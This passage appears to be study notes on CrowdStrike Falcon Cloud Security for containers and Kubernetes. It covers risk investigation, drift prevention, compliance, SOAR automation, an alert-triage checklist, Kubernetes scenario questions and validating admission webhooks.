| `GCP/AWS/SlackCredsFoundInImage` | Cloud or service credentials found in image |

### Investigating Container Risks

**Finding Unidentified Containers:**
- Unidentified containers use images that haven't been checked for vulnerabilities or were started outside K8s control
- Filter by Severity (Critical/High) and check for unassessed images
- Filter `Visible to K8s` = **No** to find containers K8s cannot see (indicates compromised node/orchestrator)

**Response Actions:**
- **Block** containers with Custom IOA rules
- **Assess** images with an image assessment tool
- **Kill** the container: Copy Container ID → run `sudo docker kill <container id>` via Real Time Response

### Container Immutability
Best practice: containers should NOT be reconfigured, updated, patched, or modified during their lifecycle. Build new images instead. Processes that alter expected behavior are **drift events** — investigate immediately.

### Investigating Kubernetes IOMs (Indicators of Misconfiguration)

**Navigate to:** `Posture and Compliance > Posture > Kubernetes Misconfigurations`

**Key columns:**
- **Prevented** — whether the KAC policy blocked the misconfiguration
- **Type** — "Misconfiguration" or "Secret" (sensitive information found)
- **Cluster** — scope of the issue (which cluster, how many containers impacted)
- **Tactic & Technique** — adversary exploit methods + remediation steps

---

## 7. Container Lifecycle Monitoring

### Kubernetes & Containers Inventory

**Navigate to:** `Cloud Security > Assets > Kubernetes and Containers Inventory`

**Dashboard provides:**
- Total containers, pods, nodes, and clusters
- Container sensor coverage percentage
- Container asset trends over last 7 days (identify unexpected spikes)

**Coverage calculation:** (Linux sensor-protected containers + Falcon container sensor-protected containers) ÷ total containers detected

### What Falcon Monitors

**Asset Metadata:**

| Asset | Metadata Tracked |
|-------|-----------------|
| **Nodes** | Host OS, cluster association, cloud platform |
| **Pods** | Running containers, labels, owner references |
| **Namespaces** | Environment tags (dev, prod), associated policies |
| **Deployments** | Image versions, security context settings |
| **Container Images** | Build source, vulnerabilities, runtime usage frequency |

**Runtime Container Behavior:**
- Process execution (unexpected binaries or shells)
- File system changes (unauthorized writes, privilege escalation attempts)
- Network connections (outbound calls to unknown IPs)
- Container privilege escalation (containers attempting to run as root)

### Why Real-Time Monitoring Matters
Static image scanning catches some risks. Real-time runtime visibility catches what scanning misses:
- **Identify risks early** — spot vulnerable/misconfigured deployments immediately after launch
- **Detect runtime threats** — catch attacks as they happen, not after
- **Map relationships** — understand how pods, services, workloads connect and influence security posture

---

## 8. Prevention Policies & Drift Detection

### Drift Prevention Workflow

**Drift:** When a container's filesystem or executed processes deviate from the original immutable image.

**Steps before enabling drift prevention:**

1. **Monitor** workloads for drift under baseline conditions
2. **Establish** that workloads do not drift normally
3. **Only then** enable drift prevention — if workloads drift during testing, do NOT enable prevention (it will block expected workloads)

**Drift Prevention Configuration:**
- Navigate to: `Endpoint Security > Configure > Prevention Policies`
- Create a Linux prevention policy
- Enable **Container Drift Prevention** toggle
- Follow the three-phase Linux prevention policy recommendations in Falcon support documentation
- Assign to proper dynamic host groups and enable

### Prevention Policy Guidance
CrowdStrike provides a **three-phase rollout** for Linux prevention policies:
- Phase 1: Detection only (monitoring)
- Phase 2: Selective prevention (low-risk rules)
- Phase 3: Full prevention (including drift prevention for validated workloads)

> **Important:** Only turn on container drift prevention for host groups where you want to block **all** drift processes.

### Pre-Runtime Security (Shift-Left)
- Assess images for vulnerabilities via CLI, image registries, and image assessment policies
- Integrate with CI/CD pipelines for proactive threat prevention
- Stop issues before they reach the runtime environment

**Navigate to:** `Cloud Security > Vulnerabilities > Image Assessments > Image Detections`

---

## 9. Compliance, Governance & Automation

### Compliance Section in Falcon Cloud Security
Helps organizations meet security regulations by:
- Detecting misconfigurations
- Enforcing security best practices
- Generating audit reports

**Kubernetes & Container Compliance:**
- Navigate to: `Posture and Compliance > Compliance > Kubernetes and Container Compliance > Rules`
- Example: CIS Docker 5.25 — "Ensure that the container is restricted from acquiring additional privileges"

### Supported Compliance Frameworks

| Framework | Full Name |
|-----------|-----------|
| **CIS** | Center for Internet Security |
| **PCI** | Payment Card Industry |
| **NIST** | National Institute of Standards and Technology |
| **SOC2** | Service Organization Control |
| **CISA** | Certified Information Systems Auditor |
| **ISO** | International Organization for Standardization |
| **HIPAA** | Health Insurance Portability and Accountability Act |
| **HITRUST** | Health Information Trust Alliance |

### Automation: Falcon Fusion SOAR

**Navigate to:** `Fusion SOAR > Workflows`

**Runtime Use Cases:**
- **FSCS Detections** — trigger workflows based on Falcon KAC detections (e.g., auto-notify email/Slack on critical severity)
- **Drift Detections** — trigger workflows when drift is identified in specific containers
- **Container Detections** — create workflows based on container detection subcategory alerts

### Scheduled Reporting

**Navigate to:** `Dashboards and Reports > Dashboards > Scheduled Reporting`

Automatically share updates about container risks. Generated reports facilitate remediation steps for runtime issues such as running containers with vulnerabilities and compliance issues.

### Automation & Policy-as-Code
- CrowdStrike supports policy enforcement in CI/CD pipelines and IaC scanning
- When policies and rules are mapped, teams can shift-left by enforcing encryption, logging, and access restrictions **before deployment**
- Non-compliant changes can be automatically blocked

---

## 10. Falcon Alert Investigation Checklist

A step-by-step operational checklist for investigating any Falcon alert:

1. **Check username and hostname** — is it a Corp machine or Non-Corp?
2. **Check timestamps** — is the alert timing accurate? Compare first/last activity vs. inserted-at time
3. **Check severity changes** — was severity modified (e.g., low → medium)?
4. **Check alert frequency** — how often is this user generating this alert?
5. **Check event count** — how many events triggered this alert?
6. **Check surrounding activity** — what happened before and after the event?
7. **Analyze command line and file paths** — are the commands and paths legitimate?
8. **Check for malicious file executions** — any suspicious executions around the alert timestamp?
9. **Check installed tools** — any network scanning tools or pentest tools on the host?
10. **Check file hashes** — correlate against all threat intelligence feeds for IOC associations
11. **Check for patterns** — any previous events with the same indicators?
12. **Check network traffic** — NetFlow, HTTP, DNS events, and process events
13. **Check process events** — any suspicious activities?
14. **Check IPs and ports** — source IPs, destination IPs, and ports used
15. **Check user role** — does the user have privileged access to perform these activities?
16. **Check MITRE ATT&CK framework** — understand the tactic, analyze threat patterns and actor behavior
17. **Assess potential impact** — what is the blast radius?

---

## 11. Kubernetes Scenario-Based Questions

### Troubleshooting & Reliability

1. **Pod stuck in `Pending`:** What steps to diagnose and resolve a deployment where all pods are stuck in Pending?
2. **`CrashLoopBackOff`:** Application pod enters CrashLoopBackOff shortly after starting — troubleshooting process and common root causes?
3. **Pod unreachable:** Web app pod shows as Running but traffic from a service isn't reaching it — how to diagnose?
4. **Node `NotReady`:** Worker node suddenly in NotReady state — how to find the cause and safely recover?
5. **PVC stuck in `Pending`:** Application's Persistent Volume Claim stuck in Pending — troubleshooting steps?

### Scalability & Performance

6. **Traffic surge:** HPA configured but not scaling up fast enough — how to handle?
7. **Resource exhaustion:** CPU/memory spike across the cluster affecting multiple workloads — identification and mitigation?
8. **Zero-downtime deployment:** How to configure Deployment strategy for smooth, risk-free updates?
9. **Canary deployment:** How to implement canary testing with a small percentage of users using K8s features?
10. **Stateful app scaling:** Key differences when scaling a StatefulSet vs. a Deployment?

### Security & Secrets Management

11. **Cluster hardening:** What measures to implement — RBAC, network policies, pod security?
12. **Compromised secrets:** A secret token was accidentally exposed in a public GitHub repo — incident response steps?
13. **Secure multi-tenancy:** Managing a shared cluster for multiple teams — how to ensure isolation and fair resource usage?
14. **Restricting root privileges:** How to enforce a policy that no containers run with root privileges?
15. **Encrypting sensitive data:** Managing API keys in K8s — ensuring encryption at rest and in transit?

### Networking & Services

16. **Ingress routing failure:** Ingress not routing external traffic to the correct service — debug steps?
17. **Pod-to-pod communication:** Configuring network policies to allow specific communication without opening the entire network?
18. **DNS resolution failure:** Pods cannot resolve service names within the cluster — where to start?
19. **Inter-service communication:** How does K8s handle service discovery and load balancing between microservices?
20. **Exposing a service:** Different methods to expose a service externally — when to use each?

### CI/CD & Automation

21. **Automating deployments:** Setting up a CI/CD pipeline for automatic build and deploy — tools and workflows?
22. **Helm chart failure:** How to handle a new Helm chart release that fails during upgrade?
23. **CRDs and Operators:** Extending K8s to manage custom resources (database, external API) — how?
24. **Multi-cluster deployment:** Deploying applications across multiple clusters (regions/providers) — management approach?
25. **GitOps workflow:** Explain GitOps in K8s context and advantages over traditional CI/CD?

---

## 12. Kubernetes Admission Process Deep Dive

### Request Lifecycle

```
[1. Authentication] → [2. Authorization] → [3. Admission Control] → [4. Object Persistence]
                                                  │
                                           ┌──────┴──────┐
                                           │              │
                                     [Mutating]    [Validating]
                                     Phase          Phase
```

1. **Authentication:** API server verifies identity of the user or service account
2. **Authorization:** API server checks RBAC permissions for the requested action
3. **Admission Control:**
   - **Mutating Phase:** Mutating admission controllers can modify the request (e.g., auto-add sidecar container, set default values)
   - **Validating Phase:** Validating admission controllers inspect and allow/deny based on rules (cannot modify the request)
4. **Object Persistence:** If all controllers approve, the object is persisted in `etcd`
5. **Error Return:** If any controller rejects, the entire process stops and an error is returned

### Validating Admission Webhook Example

**Use case:** Reject any pod creation that doesn't have the `team` label.

**Two parts required:**
1. `ValidatingWebhookConfiguration` — tells the K8s API server when and where to send admission requests
2. Webhook server — custom app that listens and decides to accept/reject based on policy

**Configuration highlights:**
- `clientConfig.service` — specifies the service and path for admission requests
- `rules` — webhook invoked only for `CREATE` operations on `pods`
- `failurePolicy: Fail` — if webhook is down, no new pods can be created (security-first)

**Test Results:**
- Pod **with** `team` label → ✅ allowed
- Pod **without** `team` label → ❌ rejected by the webhook

---

> **Key Takeaway:** Falcon Cloud Security provides **defense in depth** across the entire container lifecycle — from pre-runtime image scanning and CI/CD pipeline integration, through admission control blocking at deployment, to real-time runtime monitoring, drift detection, and automated SOAR workflows for incident response.


---

